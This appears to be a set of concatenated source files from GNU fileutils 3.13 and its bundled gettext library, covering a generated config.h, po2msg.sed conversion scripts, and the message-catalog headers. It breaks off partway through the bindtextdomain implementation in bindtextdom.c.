/* Define if major, minor, and makedev are declared in <sysmacros.h>.  */
#define MAJOR_IN_SYSMACROS 1

/* Define if on MINIX.  */
/* #undef _MINIX */

/* Define to `int' if <sys/types.h> doesn't define.  */
/* #undef mode_t */

/* Define to `long' if <sys/types.h> doesn't define.  */
/* #undef off_t */

/* Define if the system does not provide POSIX.1 features except
   with this defined.  */
/* #undef _POSIX_1_SOURCE */

/* Define if you need to in order for stat and other things to work.  */
/* #undef _POSIX_SOURCE */

/* Define as the return type of signal handlers (int or void).  */
#define RETSIGTYPE void

/* Define to `unsigned' if <sys/types.h> doesn't define.  */
/* #undef size_t */

/* If using the C implementation of alloca, define if you know the
   direction of stack growth for your system; otherwise it will be
   automatically deduced at run-time.
	STACK_DIRECTION > 0 => grows toward higher addresses
	STACK_DIRECTION < 0 => grows toward lower addresses
	STACK_DIRECTION = 0 => direction of growth unknown
 */
/* #undef STACK_DIRECTION */

/* Define if the `S_IS*' macros in <sys/stat.h> do not work properly.  */
/* #undef STAT_MACROS_BROKEN */

/* Define if you have the ANSI C header files.  */
#define STDC_HEADERS 1

/* Define if you can safely include both <sys/time.h> and <time.h>.  */
#define TIME_WITH_SYS_TIME 1

/* Define if your <sys/time.h> declares struct tm.  */
/* #undef TM_IN_SYS_TIME */

/* Define to `int' if <sys/types.h> doesn't define.  */
/* #undef uid_t */

/* Define if you have the Andrew File System.  */
/* #undef AFS */

/* Define to 1 if NLS is requested.  */
#define ENABLE_NLS 1

/* Define if your system defines TIOCGWINSZ in sys/ioctl.h.  */
/* #undef GWINSZ_IN_SYS_IOCTL */

/* Define as 1 if you have catgets and don't want to use GNU gettext.  */
/* #undef HAVE_CATGETS */

/* Define as 1 if you have gettext and don't want to use GNU gettext.  */
/* #undef HAVE_GETTEXT */

/* Define if your locale.h file contains LC_MESSAGES.  */
#define HAVE_LC_MESSAGES 1

/* Define to 1 if you have the stpcpy function.  */
#define HAVE_STPCPY 1

/* Define to `unsigned long' if <sys/types.h> doesn't define.  */
/* #undef ino_t */

/* Define if there is a member named d_ino in the struct describing
   directory headers.  */
#define D_INO_IN_DIRENT 1

/* Define if `struct utimbuf' is declared -- usually in <utime.h>.  */
#define HAVE_STRUCT_UTIMBUF 1

/* Define if there is no specific function for reading the list of
   mounted filesystems.  fread will be used to read /etc/mnttab.  [SVR2]  */
/* #undef MOUNTED_FREAD */

/* Define if (like SVR2) there is no specific function for reading the
   list of mounted filesystems, and your system has these header files:
   <sys/fstyp.h> and <sys/statfs.h>.  [SVR3]  */
/* #undef MOUNTED_FREAD_FSTYP */

/* Define if there is a function named getfsstat for reading the list
   of mounted filesystems.  [DEC Alpha running OSF/1]  */
/* #undef MOUNTED_GETFSSTAT */

/* Define if there is a function named getmnt for reading the list of
   mounted filesystems.  [Ultrix]  */
/* #undef MOUNTED_GETMNT */

/* Define if there is a function named getmntent for reading the list
   of mounted filesystems, and that function takes a single argument.
   [4.3BSD, SunOS, HP-UX, Dynix, Irix]  */
#define MOUNTED_GETMNTENT1 1

/* Define if there is a function named getmntent for reading the list of
   mounted filesystems, and that function takes two arguments.  [SVR4]  */
/* #undef MOUNTED_GETMNTENT2 */

/* Define if there is a function named getmntinfo for reading the list
   of mounted filesystems.  [4.4BSD]  */
/* #undef MOUNTED_GETMNTINFO */

/* Define if there is a function named listmntent that can be used to
   list all mounted filesystems. [UNICOS] */
/* #undef MOUNTED_LISTMNTENT */

/* Define if there is a function named mntctl that can be used to read
   the list of mounted filesystems, and there is a system header file
   that declares `struct vmount.'  [AIX]  */
/* #undef MOUNTED_VMOUNT */

/* Define to the name of the distribution.  */
#define PACKAGE "fileutils"

/* The concatenation of the strings PACKAGE, "-", and VERSION.  */
#define PACKAGE_VERSION "GNU fileutils-3.13"

/* Define to 1 if ANSI function prototypes are usable.  */
#define PROTOTYPES 1

/*  Define if  statfs takes 3 args.  [DEC Alpha running OSF/1]  */
/* #undef STAT_STATFS3_OSF1 */

/* Define if there is no specific function for reading filesystems usage
   information and you have the <sys/filsys.h> header file.  [SVR2]  */
/* #undef STAT_READ_FILSYS */

/* Define if statfs takes 2 args and struct statfs has a field named f_bsize.
   [4.3BSD, SunOS 4, HP-UX, AIX PS/2]  */
#define STAT_STATFS2_BSIZE 1

/* Define if statfs takes 2 args and struct statfs has a field named f_fsize.
   [4.4BSD, NetBSD]  */
/* #undef STAT_STATFS2_FSIZE */

/* Define if statfs takes 2 args and the second argument has
   type struct fs_data.  [Ultrix]  */
/* #undef STAT_STATFS2_FS_DATA */

/* Define if statfs takes 4 args.  [SVR3, Dynix, Irix, Dolphin]  */
/* #undef STAT_STATFS4 */

/* Define if there is a function named statvfs.  [SVR4]  */
/* #undef STAT_STATVFS */

/* Define if the block counts reported by statfs may be truncated to 2GB
   and the correct values may be stored in the f_spare array.
   [SunOS 4.1.2, 4.1.3, and 4.1.3_U1 are reported to have this problem.
   SunOS 4.1.1 seems not to be affected.]  */
#define STATFS_TRUNCATES_BLOCK_COUNTS 1

/* Define to the version of the distribution.  */
#define VERSION "3.13"

/* Define if you have the __argz_count function.  */
/* #undef HAVE___ARGZ_COUNT */

/* Define if you have the __argz_next function.  */
/* #undef HAVE___ARGZ_NEXT */

/* Define if you have the __argz_stringify function.  */
/* #undef HAVE___ARGZ_STRINGIFY */

/* Define if you have the bcopy function.  */
#define HAVE_BCOPY 1

/* Define if you have the dcgettext function.  */
/* #undef HAVE_DCGETTEXT */

/* Define if you have the endgrent function.  */
#define HAVE_ENDGRENT 1

/* Define if you have the endpwent function.  */
#define HAVE_ENDPWENT 1

/* Define if you have the fchdir function.  */
#define HAVE_FCHDIR 1

/* Define if you have the ftime function.  */
#define HAVE_FTIME 1

/* Define if you have the ftruncate function.  */
#define HAVE_FTRUNCATE 1

/* Define if you have the getcwd function.  */
#define HAVE_GETCWD 1

/* Define if you have the getgroups function.  */
#define HAVE_GETGROUPS 1

/* Define if you have the getmntinfo function.  */
/* #undef HAVE_GETMNTINFO */

/* Define if you have the getpagesize function.  */
#define HAVE_GETPAGESIZE 1

/* Define if you have the gettimeofday function.  */
#define HAVE_GETTIMEOFDAY 1

/* Define if you have the isascii function.  */
#define HAVE_ISASCII 1

/* Define if you have the lchown function.  */
/* #undef HAVE_LCHOWN */

/* Define if you have the listmntent function.  */
/* #undef HAVE_LISTMNTENT */

/* Define if you have the memcpy function.  */
#define HAVE_MEMCPY 1

/* Define if you have the mkfifo function.  */
#define HAVE_MKFIFO 1

/* Define if you have the munmap function.  */
#define HAVE_MUNMAP 1

/* Define if you have the putenv function.  */
#define HAVE_PUTENV 1

/* Define if you have the setenv function.  */
#define HAVE_SETENV 1

/* Define if you have the setlocale function.  */
#define HAVE_SETLOCALE 1

/* Define if you have the statvfs function.  */
/* #undef HAVE_STATVFS */

/* Define if you have the stpcpy function.  */
#define HAVE_STPCPY 1

/* Define if you have the strcasecmp function.  */
#define HAVE_STRCASECMP 1

/* Define if you have the strchr function.  */
#define HAVE_STRCHR 1

/* Define if you have the strerror function.  */
#define HAVE_STRERROR 1

/* Define if you have the strrchr function.  */
#define HAVE_STRRCHR 1

/* Define if you have the valloc function.  */
#define HAVE_VALLOC 1

/* Define if you have the <argz.h> header file.  */
/* #undef HAVE_ARGZ_H */

/* Define if you have the <dirent.h> header file.  */
#define HAVE_DIRENT_H 1

/* Define if you have the <errno.h> header file.  */
#define HAVE_ERRNO_H 1

/* Define if you have the <fcntl.h> header file.  */
#define HAVE_FCNTL_H 1

/* Define if you have the <limits.h> header file.  */
#define HAVE_LIMITS_H 1

/* Define if you have the <locale.h> header file.  */
#define HAVE_LOCALE_H 1

/* Define if you have the <malloc.h> header file.  */
#define HAVE_MALLOC_H 1

/* Define if you have the <mntent.h> header file.  */
#define HAVE_MNTENT_H 1

/* Define if you have the <mnttab.h> header file.  */
/* #undef HAVE_MNTTAB_H */

/* Define if you have the <ndir.h> header file.  */
/* #undef HAVE_NDIR_H */

/* Define if you have the <nl_types.h> header file.  */
#define HAVE_NL_TYPES_H 1

/* Define if you have the <string.h> header file.  */
#define HAVE_STRING_H 1

/* Define if you have the <sys/dir.h> header file.  */
/* #undef HAVE_SYS_DIR_H */

/* Define if you have the <sys/filsys.h> header file.  */
/* #undef HAVE_SYS_FILSYS_H */

/* Define if you have the <sys/fs_types.h> header file.  */
/* #undef HAVE_SYS_FS_TYPES_H */

/* Define if you have the <sys/fstyp.h> header file.  */
/* #undef HAVE_SYS_FSTYP_H */

/* Define if you have the <sys/ioctl.h> header file.  */
#define HAVE_SYS_IOCTL_H 1

/* Define if you have the <sys/mount.h> header file.  */
#define HAVE_SYS_MOUNT_H 1

/* Define if you have the <sys/ndir.h> header file.  */
/* #undef HAVE_SYS_NDIR_H */

/* Define if you have the <sys/param.h> header file.  */
#define HAVE_SYS_PARAM_H 1

/* Define if you have the <sys/statfs.h> header file.  */
/* #undef HAVE_SYS_STATFS_H */

/* Define if you have the <sys/statvfs.h> header file.  */
/* #undef HAVE_SYS_STATVFS_H */

/* Define if you have the <sys/time.h> header file.  */
#define HAVE_SYS_TIME_H 1

/* Define if you have the <sys/vfs.h> header file.  */
#define HAVE_SYS_VFS_H 1

/* Define if you have the <sys/wait.h> header file.  */
#define HAVE_SYS_WAIT_H 1

/* Define if you have the <unistd.h> header file.  */
#define HAVE_UNISTD_H 1

/* Define if you have the <utime.h> header file.  */
#define HAVE_UTIME_H 1

/* Define if you have the <values.h> header file.  */
#define HAVE_VALUES_H 1

/* Define if you have the bsd library (-lbsd).  */
/* #undef HAVE_LIBBSD */

/* Define if you have the i library (-li).  */
/* #undef HAVE_LIBI */

/* Define if you have the intl library (-lintl).  */
/* #undef HAVE_LIBINTL */

/* Define if you have the ldgc library (-lldgc).  */
/* #undef HAVE_LIBLDGC */

/* Define if you have the ypsec library (-lypsec).  */
/* #undef HAVE_LIBYPSEC */
# po2msg.sed - Convert Uniforum style .po file to Linux style .msg file
# Copyright (C) 1995 Free Software Foundation, Inc.
# Ulrich Drepper <drepper@gnu.ai.mit.edu>, 1995.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
#
#
# The first directive in the .msg should be the definition of the
# message set number.  We use always set number 1.
#
1 {
  i\
$set 1 # Automatically created by po2msg.sed
  h
  s/.*/0/
  x
}
#
# Mitch's old catalog format does not allow comments.
#
# We copy the original message as a comment into the .msg file.
#
/^msgid/ {
  s/msgid[ 	]*"//
#
# This does not work now with the new format.
# /"$/! {
#   s/\\$//
#   s/$/ ... (more lines following)"/
# }
  x
# The following nice solution is by
# Bruno <Haible@ma2s2.mathematik.uni-karlsruhe.de>
  td
# Increment a decimal number in pattern space.
# First hide trailing `9' digits.
  :d
  s/9\(_*\)$/_\1/
  td
# Assure at least one digit is available.
  s/^\(_*\)$/0\1/
# Increment the last digit.
  s/8\(_*\)$/9\1/
  s/7\(_*\)$/8\1/
  s/6\(_*\)$/7\1/
  s/5\(_*\)$/6\1/
  s/4\(_*\)$/5\1/
  s/3\(_*\)$/4\1/
  s/2\(_*\)$/3\1/
  s/1\(_*\)$/2\1/
  s/0\(_*\)$/1\1/
# Convert the hidden `9' digits to `0's.
  s/_/0/g
  x
  G
  s/\(.*\)"\n\([0-9]*\)/$ #\2 Original Message:(\1)/p
}
#
# The .msg file contains, other then the .po file, only the translations
# but each given a unique ID.  Starting from 1 and incrementing by 1 for
# each message we assign them to the messages.
# It is important that the .po file used to generate the cat-id-tbl.c file
# (with po-to-tbl) is the same as the one used here.  (At least the order
# of declarations must not be changed.)
#
/^msgstr/ {
  s/msgstr[ 	]*"\(.*\)"/# \1/
# Clear substitution flag.
  tb
# Append the next line.
  :b
  N
# Look whether second part is continuation line.
  s/\(.*\n\)"\(.*\)"/\1\2/
# Yes, then branch.
  ta
  P
  D
# Note that D includes a jump to the start!!
# We found a continuation line.  But before printing insert '\'.
  :a
  s/\(.*\)\(\n.*\)/\1\\\2/
  P
# We cannot use D here.
  s/.*\n\(.*\)/\1/
  tb
}
d
# po2msg.sed - Convert Uniforum style .po file to X/Open style .msg file
# Copyright (C) 1995 Free Software Foundation, Inc.
# Ulrich Drepper <drepper@gnu.ai.mit.edu>, 1995.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
#
#
# The first directive in the .msg should be the definition of the
# message set number.  We use always set number 1.
#
1 {
  i\
$set 1 # Automatically created by po2msg.sed
  h
  s/.*/0/
  x
}
#
# We copy all comments into the .msg file.  Perhaps they can help.
#
/^#/ s/^#[ 	]*/$ /p
#
# We copy the original message as a comment into the .msg file.
#
/^msgid/ {
# Does not work now
#  /"$/! {
#    s/\\$//
#    s/$/ ... (more lines following)"/
#  }
  s/^msgid[ 	]*"\(.*\)"$/$ Original Message: \1/
  p
}
#
# The .msg file contains, other then the .po file, only the translations
# but each given a unique ID.  Starting from 1 and incrementing by 1 for
# each message we assign them to the messages.
# It is important that the .po file used to generate the cat-id-tbl.c file
# (with po-to-tbl) is the same as the one used here.  (At least the order
# of declarations must not be changed.)
#
/^msgstr/ {
  s/msgstr[ 	]*"\(.*\)"/\1/
  x
# The following nice solution is by
# Bruno <Haible@ma2s2.mathematik.uni-karlsruhe.de>
  td
# Increment a decimal number in pattern space.
# First hide trailing `9' digits.
  :d
  s/9\(_*\)$/_\1/
  td
# Assure at least one digit is available.
  s/^\(_*\)$/0\1/
# Increment the last digit.
  s/8\(_*\)$/9\1/
  s/7\(_*\)$/8\1/
  s/6\(_*\)$/7\1/
  s/5\(_*\)$/6\1/
  s/4\(_*\)$/5\1/
  s/3\(_*\)$/4\1/
  s/2\(_*\)$/3\1/
  s/1\(_*\)$/2\1/
  s/0\(_*\)$/1\1/
# Convert the hidden `9' digits to `0's.
  s/_/0/g
  x
# Bring the line in the format `<number> <message>'
  G
  s/^[^\n]*$/& /
  s/\(.*\)\n\([0-9]*\)/\2 \1/
# Clear flag from last substitution.
  tb
# Append the next line.
  :b
  N
# Look whether second part is a continuation line.
  s/\(.*\n\)"\(.*\)"/\1\2/
# Yes, then branch.
  ta
  P
  D
# Note that `D' includes a jump to the start!!
# We found a continuation line.  But before printing insert '\'.
  :a
  s/\(.*\)\(\n.*\)/\1\\\2/
  P
# We cannot use the sed command `D' here
  s/.*\n\(.*\)/\1/
  tb
}
d
/* gettext.h - internal header for GNU gettext internationalization functions
   Copyright (C) 1995 Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330,
Boston, MA 02111-1307, USA.  */

#ifndef _GETTEXT_H
#define _GETTEXT_H 1

#include <stdio.h>

#if HAVE_LIMITS_H || _LIBC
# include <limits.h>
#endif

/* @@ end of prolog @@ */

/* The magic number of the GNU message catalog format.  */
#define _MAGIC 0x950412de
#define _MAGIC_SWAPPED 0xde120495

/* Revision number of the currently used .mo (binary) file format.  */
#define MO_REVISION_NUMBER 0

/* The following contortions are an attempt to use the C preprocessor
   to determine an unsigned integral type that is 32 bits wide.  An
   alternative approach is to use autoconf's AC_CHECK_SIZEOF macro, but
   doing that would require that the configure script compile and *run*
   the resulting executable.  Locally running cross-compiled executables
   is usually not possible.  */

#if __STDC__
# define UINT_MAX_32_BITS 4294967295U
#else
# define UINT_MAX_32_BITS 0xFFFFFFFF
#endif

/* If UINT_MAX isn't defined, assume it's a 32-bit type.
   This should be valid for all systems GNU cares about because
   that doesn't include 16-bit systems, and only modern systems
   (that certainly have <limits.h>) have 64+-bit integral types.  */

#ifndef UINT_MAX
# define UINT_MAX UINT_MAX_32_BITS
#endif

#if UINT_MAX == UINT_MAX_32_BITS
typedef unsigned nls_uint32;
#else
# if USHRT_MAX == UINT_MAX_32_BITS
typedef unsigned short nls_uint32;
# else
#  if ULONG_MAX == UINT_MAX_32_BITS
typedef unsigned long nls_uint32;
#  else
  /* The following line is intended to throw an error.  Using #error is
     not portable enough.  */
  "Cannot determine unsigned 32-bit data type."
#  endif
# endif
#endif


/* Header for binary .mo file format.  */
struct mo_file_header
{
  /* The magic number.  */
  nls_uint32 magic;
  /* The revision number of the file format.  */
  nls_uint32 revision;
  /* The number of strings pairs.  */
  nls_uint32 nstrings;
  /* Offset of table with start offsets of original strings.  */
  nls_uint32 orig_tab_offset;
  /* Offset of table with start offsets of translation strings.  */
  nls_uint32 trans_tab_offset;
  /* Size of hashing table.  */
  nls_uint32 hash_tab_size;
  /* Offset of first hashing entry.  */
  nls_uint32 hash_tab_offset;
};

struct string_desc
{
  /* Length of addressed string.  */
  nls_uint32 length;
  /* Offset of string in file.  */
  nls_uint32 offset;
};

/* @@ begin of epilog @@ */

#endif	/* gettext.h  */
/* gettextP.h -- header describing internals of gettext library
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifndef _GETTEXTP_H
#define _GETTEXTP_H

#include "loadinfo.h"

/* @@ end of prolog @@ */

#ifndef PARAMS
# if __STDC__
#  define PARAMS(args) args
# else
#  define PARAMS(args) ()
# endif
#endif

#ifndef W
# define W(flag, data) ((flag) ? SWAP (data) : (data))
#endif


static nls_uint32 SWAP PARAMS ((nls_uint32 i));

static inline nls_uint32
SWAP (i)
     nls_uint32 i;
{
  return (i << 24) | ((i & 0xff00) << 8) | ((i >> 8) & 0xff00) | (i >> 24);
}


struct loaded_domain
{
  const char *data;
  int must_swap;
  nls_uint32 nstrings;
  struct string_desc *orig_tab;
  struct string_desc *trans_tab;
  nls_uint32 hash_size;
  nls_uint32 *hash_tab;
};

struct binding
{
  struct binding *next;
  char *domainname;
  char *dirname;
};

struct loaded_l10nfile *_nl_find_domain PARAMS ((const char *__dirname,
						 char *__locale,
						 const char *__domainname));
void _nl_load_domain PARAMS ((struct loaded_l10nfile *__domain));

/* @@ begin of epilog @@ */

#endif /* gettextP.h  */
/* hash-string - Implements a string hashing function.
   Copyright (C) 1995 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_VALUES_H
# include <values.h>
#endif

/* @@ end of prolog @@ */

#ifndef PARAMS
# if __STDC__
#  define PARAMS(Args) Args
# else
#  define PARAMS(Args) ()
# endif
#endif

/* We assume to have `unsigned long int' value with at least 32 bits.  */
#define HASHWORDBITS 32


/* Defines the so called `hashpjw' function by P.J. Weinberger
   [see Aho/Sethi/Ullman, COMPILERS: Principles, Techniques and Tools,
   1986, 1987 Bell Telephone Laboratories, Inc.]  */
static unsigned long hash_string PARAMS ((const char *__str_param));

static inline unsigned long
hash_string (str_param)
     const char *str_param;
{
  unsigned long int hval, g;
  const char *str = str_param;

  /* Compute the hash value for the given string.  */
  hval = 0;
  while (*str != '\0')
    {
      hval <<= 4;
      hval += (unsigned long) *str++;
      g = hval & ((unsigned long) 0xf << (HASHWORDBITS - 4));
      if (g != 0)
	{
	  hval ^= g >> (HASHWORDBITS - 8);
	  hval ^= g;
	}
    }
  return hval;
}
/* libgettext.h -- Message catalogs for internationalization.
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* Because on some systems (e.g. Solaris) we sometimes have to include
   the systems libintl.h as well as this file we have more complex
   include protection above.  But the systems header might perhaps also
   define _LIBINTL_H and therefore we have to protect the definition here.  */

#if !defined (_LIBINTL_H) || !defined (_LIBGETTEXT_H)
#if !defined (_LIBINTL_H)
# define _LIBINTL_H	1
#endif
#define _LIBGETTEXT_H	1

/* We define an additional symbol to signal that we use the GNU
   implementation of gettext.  */
#define __USE_GNU_GETTEXT 1

#include <sys/types.h>

#if HAVE_LOCALE_H
# include <locale.h>
#endif


#ifdef __cplusplus
extern "C" {
#endif

/* @@ end of prolog @@ */

#ifndef PARAMS
# if __STDC__
#  define PARAMS(args) args
# else
#  define PARAMS(args) ()
# endif
#endif

#ifndef NULL
# if !defined __cplusplus || defined __GNUC__
#  define NULL ((void *) 0)
# else
#  define NULL (0)
# endif
#endif

#if !HAVE_LC_MESSAGES
/* This value determines the behaviour of the gettext() and dgettext()
   function.  But some system does not have this defined.  Define it
   to a default value.  */
# define LC_MESSAGES (-1)
#endif


/* Declarations for gettext-using-catgets interface.  Derived from
   Jim Meyering's libintl.h.  */
struct _msg_ent
{
  const char *_msg;
  int _msg_number;
};


#if HAVE_CATGETS
/* These two variables are defined in the automatically by po-to-tbl.sed
   generated file `cat-id-tbl.c'.  */
extern const struct _msg_ent _msg_tbl[];
extern int _msg_tbl_length;
#endif


/* For automatical extraction of messages sometimes no real
   translation is needed.  Instead the string itself is the result.  */
#define gettext_noop(Str) (Str)

/* Look up MSGID in the current default message catalog for the current
   LC_MESSAGES locale.  If not found, returns MSGID itself (the default
   text).  */
extern char *gettext PARAMS ((const char *__msgid));
extern char *gettext__ PARAMS ((const char *__msgid));

/* Look up MSGID in the DOMAINNAME message catalog for the current
   LC_MESSAGES locale.  */
extern char *dgettext PARAMS ((const char *__domainname, const char *__msgid));
extern char *dgettext__ PARAMS ((const char *__domainname,
				 const char *__msgid));

/* Look up MSGID in the DOMAINNAME message catalog for the current CATEGORY
   locale.  */
extern char *dcgettext PARAMS ((const char *__domainname, const char *__msgid,
				int __category));
extern char *dcgettext__ PARAMS ((const char *__domainname,
				  const char *__msgid, int __category));


/* Set the current default message catalog to DOMAINNAME.
   If DOMAINNAME is null, return the current default.
   If DOMAINNAME is "", reset to the default of "messages".  */
extern char *textdomain PARAMS ((const char *__domainname));
extern char *textdomain__ PARAMS ((const char *__domainname));

/* Specify that the DOMAINNAME message catalog will be found
   in DIRNAME rather than in the system locale data base.  */
extern char *bindtextdomain PARAMS ((const char *__domainname,
				  const char *__dirname));
extern char *bindtextdomain__ PARAMS ((const char *__domainname,
				    const char *__dirname));

#if ENABLE_NLS

/* Solaris 2.3 has the gettext function but dcgettext is missing.
   So we omit this optimization for Solaris 2.3.  BTW, Solaris 2.4
   has dcgettext.  */
# if !HAVE_CATGETS && (!HAVE_GETTEXT || HAVE_DCGETTEXT)

#  define gettext(Msgid)						      \
     dgettext (NULL, Msgid)

#  define dgettext(Domainname, Msgid)					      \
     dcgettext (Domainname, Msgid, LC_MESSAGES)

#  if defined __GNUC__ && __GNUC__ == 2 && __GNUC_MINOR__ >= 7
/* This global variable is defined in loadmsgcat.c.  We need a sign,
   whether a new catalog was loaded, which can be associated with all
   translations.  */
extern int _nl_msg_cat_cntr;

#   define dcgettext(Domainname, Msgid, Category)			      \
  (__extension__							      \
   ({									      \
     char *__result;							      \
     if (__builtin_constant_p (Msgid))					      \
       {								      \
	 static char *__translation__;					      \
	 static int __catalog_counter__;				      \
	 if (! __translation__ || __catalog_counter__ != _nl_msg_cat_cntr)    \
	   {								      \
	     __translation__ =						      \
	       dcgettext__ ((Domainname), (Msgid), (Category));		      \
	     __catalog_counter__ = _nl_msg_cat_cntr;			      \
	   }								      \
	 __result = __translation__;					      \
       }								      \
     else								      \
       __result = dcgettext__ ((Domainname), (Msgid), (Category));	      \
     __result;								      \
    }))
#  endif
# endif

#else

# define gettext(Msgid) (Msgid)
# define dgettext(Domainname, Msgid) (Msgid)
# define dcgettext(Domainname, Msgid, Category) (Msgid)
# define textdomain(Domainname) while (0) /* nothing */
# define bindtextdomain(Domainname, Dirname) while (0) /* nothing */

#endif

/* @@ begin of epilog @@ */

#ifdef __cplusplus
}
#endif

#endif
#ifndef PARAMS
# if __STDC__
#  define PARAMS(args) args
# else
#  define PARAMS(args) ()
# endif
#endif

/* Encoding of locale name parts.  */
#define CEN_REVISION		1
#define CEN_SPONSOR		2
#define CEN_SPECIAL		4
#define XPG_NORM_CODESET	8
#define XPG_CODESET		16
#define TERRITORY		32
#define CEN_AUDIENCE		64
#define XPG_MODIFIER		128

#define CEN_SPECIFIC	(CEN_REVISION|CEN_SPONSOR|CEN_SPECIAL|CEN_AUDIENCE)
#define XPG_SPECIFIC	(XPG_CODESET|XPG_NORM_CODESET|XPG_MODIFIER)


struct loaded_l10nfile
{
  const char *filename;
  int decided;

  const void *data;

  struct loaded_l10nfile *next;
  struct loaded_l10nfile *successor[1];
};


extern const char *_nl_normalize_codeset PARAMS ((const char *codeset,
						  size_t name_len));

extern struct loaded_l10nfile *
_nl_make_l10nflist PARAMS ((struct loaded_l10nfile **l10nfile_list,
			    const char *dirlist, size_t dirlist_len, int mask,
			    const char *language, const char *territory,
			    const char *codeset,
			    const char *normalized_codeset,
			    const char *modifier, const char *special,
			    const char *sponsor, const char *revision,
			    const char *filename, int do_allocate));


extern const char *_nl_expand_alias PARAMS ((const char *name));

extern int _nl_explode_name PARAMS ((char *name, const char **language,
				     const char **modifier,
				     const char **territory,
				     const char **codeset,
				     const char **normalized_codeset,
				     const char **special,
				     const char **sponsor,
				     const char **revision));
/* bindtextdom.c -- implementation of the bindtextdomain(3) function
   Copyright (C) 1995 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#if defined STDC_HEADERS || defined _LIBC
# include <stdlib.h>
#else
# ifdef HAVE_MALLOC_H
#  include <malloc.h>
# else
void free ();
# endif
#endif

#if defined HAVE_STRING_H || defined _LIBC
# include <string.h>
#else
# include <strings.h>
#endif

#ifdef _LIBC
# include <libintl.h>
#else
# include "libgettext.h"
#endif
#include "gettext.h"
#include "gettextP.h"

/* @@ end of prolog @@ */

/* Contains the default location of the message catalogs.  */
extern const char _nl_default_dirname[];

/* List with bindings of specific domains.  */
extern struct binding *_nl_domain_bindings;


/* Names for the libintl functions are a problem.  They must not clash
   with existing names and they should follow ANSI C.  But this source
   code is also used in GNU C Library where the names have a __
   prefix.  So we have to make a difference here.  */
#ifdef _LIBC
# define BINDTEXTDOMAIN __bindtextdomain
#else
# define BINDTEXTDOMAIN bindtextdomain__
#endif

/* Specify that the DOMAINNAME message catalog will be found
   in DIRNAME rather than in the system locale data base.  */
char *
BINDTEXTDOMAIN (domainname, dirname)
     const char *domainname;
     const char *dirname;
{
  struct binding *binding;

  /* Some sanity checks.  */
  if (domainname == NULL || domainname[0] == '\0')
    return NULL;

  for (binding = _nl_domain_bindings; binding != NULL; binding = binding->next)
    {
      int compare = strcmp (domainname, binding->domainname);
      if (compare == 0)
	/* We found it!  */
	break;
      if (compare < 0)
	{
	  /* It is not in the list.  */
	  binding = NULL;
	  break;
	}
    }

  if (dirname == NULL)
    /* The current binding has be to returned.  */
    return binding == NULL ? (char *) _nl_default_dirname : binding->dirname;

  if (binding != NULL)
    {
      /* The domain is already bound.  Replace the old binding.  */
      char *new_dirname;

      if (strcmp (dirname, _nl_default_dirname) == 0)
	new_dirname = (char *) _nl_default_dirname;
      else
	{
	  size_t len = strlen (dirname) + 1;
	  new_dirname = (char *) malloc (len);
	  if (new_dirname == NULL)
	    return NULL;

	  memcpy (new_dirname, dirname, len);
	}

      if (strcmp (binding->dirname, _nl_default_dirname) != 0)
        free (binding->dirname);

      binding->dirname = new_dirname;
    }
  else
    {
